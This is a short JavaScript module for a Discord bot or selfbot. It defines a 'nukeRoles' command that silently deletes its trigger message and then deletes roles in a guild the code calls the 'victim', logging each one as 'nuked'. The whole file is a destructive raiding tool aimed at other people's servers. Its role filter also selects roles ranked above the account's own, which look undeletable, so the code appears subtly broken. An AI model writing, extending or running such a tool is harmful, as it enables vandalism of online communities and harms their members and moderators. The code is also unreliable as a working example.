const Logger = require('../utils/logger.js');

module.exports = async function nukeRoles(message, client) {
    await message.delete();
    if (message.author.id !== client.user.id) return;
    const victimGuild = message.guild;
    let nukedCount = 0;

    const victimRoles = victimGuild.roles.cache.filter(
        role => role.comparePositionTo(victimGuild.members.me.roles.highest) > 0
    );

    for (const victimRole of victimRoles.values()) {
        try {
            Logger.info(`Nuking role: ${victimRole.name}`);
            await victimRole.delete();
            nukedCount++;
        } catch (error) {
            Logger.error(`Failed to delete role: ${victimRole.name}. Error: ${error.message}`);
        }
    }

    Logger.success(`Nuked ${nukedCount} roles`);
};